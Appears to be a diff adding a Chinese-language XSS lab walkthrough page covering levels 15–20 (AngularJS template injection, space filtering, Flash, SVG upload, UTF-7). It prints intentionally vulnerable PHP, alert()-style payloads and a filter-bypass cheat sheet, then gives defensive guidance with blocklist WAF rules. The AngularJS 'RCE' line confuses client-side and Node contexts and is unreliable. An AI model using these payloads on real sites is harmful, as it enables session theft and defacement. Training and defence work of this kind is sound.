+                            <p>这一关使用了AngularJS。尝试AngularJS模板注入：</p>
+                            <pre><code class="language-html">{{constructor.constructor('alert(&quot;XSS&quot;)')()}}
+{{7*7}}
+{{'a'.toUpperCase()}}</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+header(&quot;Content-type: text/html;charset=utf-8&quot;);
+echo '&lt;body&gt;
+&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;
+&lt;div ng-app&gt;
+    &lt;input type=&quot;text&quot; ng-model=&quot;message&quot;&gt;
+    &lt;p&gt;{{message}}&lt;/p&gt;
+&lt;/div&gt;
+&lt;/body&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>使用了AngularJS 1.2.0版本</li>
+                                <li>存在模板注入漏洞</li>
+                                <li>可以通过AngularJS表达式执行JavaScript</li>
+                            </ul>
+                            <p><strong>AngularJS注入技巧</strong>：</p>
+                            <pre><code class="language-html">{{constructor.constructor('alert(&quot;XSS&quot;)')()}}
+{{7*7}}  // 测试表达式
+{{'a'.toUpperCase()}}  // 字符串操作
+{{[].pop.constructor('return process')().mainModule.require('child_process').exec('ls')}}  // RCE</code></pre>
+                            <hr>
+                            <h3>Level 16: 空格和关键字过滤</h3>
+                            <h4>攻击过程</h4>
+                            <p>尝试各种payload发现空格和关键字被过滤。使用<code>/</code>替代空格：</p>
+                            <pre><code class="language-html">&lt;svg/onload=alert()&gt;
+&lt;img/src=x/onerror=alert()&gt;</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;*&quot;,$str);
+$str3=str_replace(&quot; &quot;,&quot;*&quot;,$str2);
+$str4=str_replace(&quot;/&quot;,&quot;*&quot;,$str3);
+$str5=str_replace(&quot; &quot;,&quot;*&quot;,$str4);
+echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>过滤了<code>script</code>、空格、<code>/</code>字符</li>
+                                <li>使用<code>*</code>替换被过滤的字符</li>
+                                <li>可以通过其他字符替代空格</li>
+                            </ul>
+                            <p><strong>绕过技巧</strong>：</p>
+                            <pre><code class="language-html">&lt;svg/onload=alert()&gt;
+&lt;img/src=x/onerror=alert()&gt;
+&lt;iframe/src=javascript:alert()&gt;</code></pre>
+                            <hr>
+                            <h3>Level 17: Flash XSS</h3>
+                            <h4>攻击过程</h4>
+                            <p>这一关使用了Flash。需要通过Flash参数注入XSS：</p>
+                            <pre><code class="language-html">arg01=version&amp;arg02=&lt;script&gt;alert()&lt;/script&gt;</code></pre>
+                            <p>或者使用Flash的getURL功能：</p>
+                            <pre><code class="language-html">arg01=id&amp;arg02=\&quot;))}catch(e){alert(1)}//</code></pre>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100 height=100&gt;&quot;;
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>使用了Flash文件<code>xsf01.swf</code></li>
+                                <li>通过URL参数传递给Flash</li>
+                                <li>Flash可能存在XSS漏洞</li>
+                            </ul>
+                            <hr>
+                            <h3>Level 18: 文件上传XSS</h3>
+                            <h4>攻击过程</h4>
+                            <p>上传包含XSS的SVG文件：</p>
+                            <pre><code class="language-xml">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert('XSS')&quot;&gt;
+    &lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;3&quot; fill=&quot;red&quot; /&gt;
+&lt;/svg&gt;</code></pre>
+                            <p>或者上传HTML文件：</p>
+                            <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+if(isset($_POST[&quot;submit&quot;])){
+    $filename = $_FILES[&quot;upload_file&quot;][&quot;name&quot;];
+    $ext = pathinfo($filename, PATHINFO_EXTENSION);
+    if($ext == &quot;gif&quot; || $ext == &quot;jpg&quot; || $ext == &quot;png&quot; || $ext == &quot;jpeg&quot;){
+        $temp_file = $_FILES[&quot;upload_file&quot;][&quot;tmp_name&quot;];
+        $img_path = &quot;upload/&quot;.$filename;
+        if(move_uploaded_file($temp_file, $img_path)){
+            echo &quot;&lt;img src='$img_path'&gt;&quot;;
+        }else{
+            echo &quot;上传失败！&quot;;
+        }
+    }else{
+        echo &quot;文件类型不正确！&quot;;
+    }
+}
+?&gt;
+&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;upload_file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;
+&lt;/form&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>检查文件扩展名</li>
+                                <li>允许上传图片文件</li>
+                                <li>直接输出上传的文件</li>
+                                <li>可以通过SVG文件注入XSS</li>
+                            </ul>
+                            <hr>
+                            <h3>Level 19: UTF-7编码绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>使用UTF-7编码绕过：</p>
+                            <pre><code class="language-html">+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-</code></pre>
+                            <p>或者：</p>
+                            <pre><code class="language-html">+ADw-img src=x onerror=alert('XSS')+AD4-</code></pre>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+header(&quot;Content-Type: text/html; charset=utf-7&quot;);
+echo $_GET[&quot;keyword&quot;];
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>设置了UTF-7编码</li>
+                                <li>可以通过UTF-7编码绕过过滤</li>
+                                <li>UTF-7编码可以绕过很多WAF</li>
+                            </ul>
+                            <hr>
+                            <h3>Level 20: 综合测试</h3>
+                            <h4>攻击过程</h4>
+                            <p>这一关是综合测试，需要运用之前学到的所有技巧：</p>
+                            <pre><code class="language-html">&lt;svg/onload=alert()&gt;
+&lt;img/src=x/onerror=alert()&gt;
+&lt;iframe/src=javascript:alert()&gt;</code></pre>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2&gt;&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>没有任何过滤</li>
+                                <li>可以使用任何payload</li>
+                                <li>考验综合运用能力</li>
+                            </ul>
+                            <hr>
+                            <h2>🛡️ 绕过技巧总结</h2>
+                            <h3>1. 编码绕过</h3>
+                            <pre><code class="language-html">&lt;!-- HTML实体编码 --&gt;
+&amp;#60;script&amp;#62;alert('XSS')&amp;#60;/script&amp;#62;
+
+&lt;!-- URL编码 --&gt;
+%3Cscript%3Ealert('XSS')%3C/script%3E
+
+&lt;!-- 十六进制编码 --&gt;
+\x3Cscript\x3Ealert('XSS')\x3C/script\x3E
+
+&lt;!-- Base64编码 --&gt;
+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+&lt;!-- UTF-7编码 --&gt;
++ADw-script+AD4-alert('XSS')+ADw-/script+AD4-</code></pre>
+                            <h3>2. 标签替换</h3>
+                            <pre><code class="language-html">&lt;!-- 常用XSS标签 --&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;iframe src=javascript:alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;input onfocus=alert('XSS') autofocus&gt;
+&lt;details open ontoggle=alert('XSS')&gt;
+&lt;marquee onstart=alert('XSS')&gt;
+&lt;video onloadstart=alert('XSS')&gt;
+&lt;audio onloadstart=alert('XSS')&gt;</code></pre>
+                            <h3>3. 事件处理器</h3>
+                            <pre><code class="language-html">onmouseover    // 鼠标悬停
+onclick        // 鼠标点击
+onload         // 页面加载
+onerror        // 错误发生
+onfocus        // 获得焦点
+onblur         // 失去焦点
+onchange       // 值改变
+onsubmit       // 表单提交
+onkeydown      // 键盘按下
+onkeyup        // 键盘松开
+onstart        // 开始执行
+onend          // 结束执行
+ontoggle       // 切换状态</code></pre>
+                            <h3>4. 过滤绕过</h3>
+                            <pre><code class="language-html">&lt;!-- 大小写混合 --&gt;
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+
+&lt;!-- 双写绕过 --&gt;
+&lt;scrscriptipt&gt;alert('XSS')&lt;/scrscriptipt&gt;
+
+&lt;!-- 注释绕过 --&gt;
+&lt;scr&lt;!-- --&gt;ipt&gt;alert('XSS')&lt;/scr&lt;!-- --&gt;ipt&gt;
+
+&lt;!-- 编码绕过 --&gt;
+%3Cimg%20src=x%20onerror=alert('XSS')%3E
+
+&lt;!-- 空格绕过 --&gt;
+&lt;img/src=x/onerror=alert('XSS')&gt;
+&lt;svg/onload=alert('XSS')&gt;
+
+&lt;!-- 字符串拼接 --&gt;
+&quot;str&quot;+&quot;ing&quot;</code></pre>
+                            <h3>5. JavaScript伪协议</h3>
+                            <pre><code class="language-html">javascript:alert('XSS')
+javascript://comment%0aalert('XSS')
+javascript:http://test.com%0aalert('XSS')</code></pre>
+                            <h3>6. CSS注入</h3>
+                            <pre><code class="language-html">&lt;style&gt;@import url('javascript:alert(&quot;XSS&quot;)');&lt;/style&gt;
+&lt;div style=&quot;background:url(javascript:alert('XSS'))&quot;&gt;
+&lt;style&gt;body{background:url(javascript:alert('XSS'))}&lt;/style&gt;</code></pre>
+                            <h3>7. AngularJS注入</h3>
+                            <pre><code class="language-html">{{constructor.constructor('alert(&quot;XSS&quot;)')()}}
+{{7*7}}
+{{'a'.toUpperCase()}}
+{{[].pop.constructor('return process')().mainModule.require('child_process').exec('ls')}}</code></pre>
+                            <hr>
+                            <h2>🛡️ 防御建议</h2>
+                            <h3>1. 输入验证</h3>
+                            <pre><code class="language-php">// 白名单验证
+function validateInput($input) {
+    return preg_match('/^[a-zA-Z0-9\s]+$/', $input);
+}
+
+// 长度限制
+function validateLength($input, $min, $max) {
+    $length = strlen($input);
+    return $length &gt;= $min &amp;&amp; $length &lt;= $max;
+}
+
+// 黑名单过滤（不推荐，优先使用白名单）
+function blacklistFilter($input) {
+    $blacklist = ['&lt;script', 'javascript:', 'onerror', 'onload'];
+    foreach ($blacklist as $pattern) {
+        if (stripos($input, $pattern) !== false) {
+            return false;
+        }
+    }
+    return true;
+}</code></pre>
+                            <h3>2. 输出编码</h3>
+                            <pre><code class="language-php">// HTML编码
+echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+
+// JavaScript编码
+function jsEscape($str) {
+    return json_encode($str, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
+}
+
+// URL编码
+echo urlencode($input);
+
+// 属性编码
+function attributeEncode($str) {
+    return htmlspecialchars($str, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+}</code></pre>
+                            <h3>3. CSP策略</h3>
+                            <pre><code class="language-html">&lt;!-- 严格的CSP策略 --&gt;
+&lt;meta http-equiv=&quot;Content-Security-Policy&quot; 
+      content=&quot;default-src 'self'; 
+              script-src 'self' 'unsafe-inline'; 
+              style-src 'self' 'unsafe-inline'; 
+              img-src 'self' data:; 
+              connect-src 'self'; 
+              font-src 'self'; 
+              object-src 'none'; 
+              media-src 'self'; 
+              frame-src 'none';&quot;&gt;
+
+&lt;!-- HTTP头设置 --&gt;
+&lt;?php
+header(&quot;Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';&quot;);
+?&gt;</code></pre>
+                            <h3>4. HTTP安全头</h3>
+                            <pre><code class="language-php">// XSS保护
+header(&quot;X-XSS-Protection: 1; mode=block&quot;);
+
+// 内容类型嗅探保护
+header(&quot;X-Content-Type-Options: nosniff&quot;);
+
+// 点击劫持保护
+header(&quot;X-Frame-Options: DENY&quot;);
+
+// 严格传输安全
+header(&quot;Strict-Transport-Security: max-age=31536000; includeSubDomains&quot;);
+
+// 内容安全策略
+header(&quot;Content-Security-Policy: default-src 'self'; script-src 'self'&quot;);</code></pre>
+                            <h3>5. 框架防护</h3>
+                            <pre><code class="language-php">// Laravel框架
+{{ $input }}  // 自动转义
+{!! $input !!} // 不转义（谨慎使用）
+
+// Symfony框架
+{{ input|escape }}  // 自动转义
+
+// ThinkPHP框架
+{$input|htmlspecialchars}  // 手动转义</code></pre>
+                            <h3>6. DOM操作防护</h3>
+                            <pre><code class="language-javascript">// 安全的DOM操作
+function safeHTML(str) {
+    return str.replace(/[&amp;&lt;&gt;&quot;']/g, function(match) {
+        const escape = {
+            '&amp;': '&amp;amp;',
+            '&lt;': '&amp;lt;',
+            '&gt;': '&amp;gt;',
+            '&quot;': '&amp;quot;',
+            &quot;'&quot;: '&amp;#39;'
+        };
+        return escape[match];
+    });
+}
+
+// 使用textContent而不是innerHTML
+element.textContent = userInput;  // 安全
+element.innerHTML = userInput;   // 危险
+
+// 使用DOMPurify库
+import DOMPurify from 'dompurify';
+const cleanHTML = DOMPurify.sanitize(dirtyHTML);</code></pre>
+                            <h3>7. 文件上传防护</h3>
+                            <pre><code class="language-php">// 文件类型检查
+$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
+
+if (!in_array($mime_type, $allowedTypes)) {
+    die('文件类型不允许');
+}
+
+// 文件扩展名检查
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
+$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+
+if (!in_array($extension, $allowedExtensions)) {
+    die('文件扩展名不允许');
+}
+
+// 文件内容检查
+$imageInfo = getimagesize($_FILES['file']['tmp_name']);
+if ($imageInfo === false) {
+    die('文件不是有效的图片');
+}
+
+// 重命名文件
+$newFilename = uniqid() . '.' . $extension;
+$uploadPath = 'uploads/' . $newFilename;
+
+if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
+    echo '文件上传成功';
+} else {
+    echo '文件上传失败';
+}</code></pre>
+                            <h3>8. WAF配置</h3>
+                            <pre><code class="language-nginx"># Nginx WAF配置
+location ~* \.(php|jsp|asp)$ {
+    # XSS防护
+    if ($args ~* &quot;&lt;script&gt;|javascript:|onload=|onerror=&quot;) {
+        return 403;
+    }
+    
+    # SQL注入防护
+    if ($args ~* &quot;union.*select|select.*from|insert.*into&quot;) {
+        return 403;
+    }
+}</code></pre>
+                            <hr>
+                            <h2>📚 参考资源</h2>
+                            <h3>技术文档</h3>
+                            <ul>
+                                <li><a
+                                        href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP
+                                        XSS Prevention Cheat Sheet</a></li>
+                                <li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger Web
+                                        Security
+                                        Academy</a></li>
+                                <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security">MDN Web Security</a>
+                                </li>
+                            </ul>
+                            <h3>工具和框架</h3>
+                            <ul>
+                                <li><a href="https://github.com/payloadbox/xss-payload-list">XSS Payloads Collection</a>
+                                </li>
+                                <li><a href="https://github.com/cure53/DOMPurify">DOMPurify - HTML Sanitizer</a></li>
+                                <li><a href="https://csp-evaluator.withgoogle.com/">Content Security Policy
+                                        Evaluator</a></li>
+                            </ul>
+                            <h3>学习平台</h3>
+                            <ul>
+                                <li><a href="https://www.hackthebox.com/">Hack The Box</a></li>
+                                <li><a href="https://tryhackme.com/">TryHackMe</a></li>
+                                <li><a href="https://github.com/WebGoat/WebGoat">OWASP WebGoat</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+</body>
+
+</html>
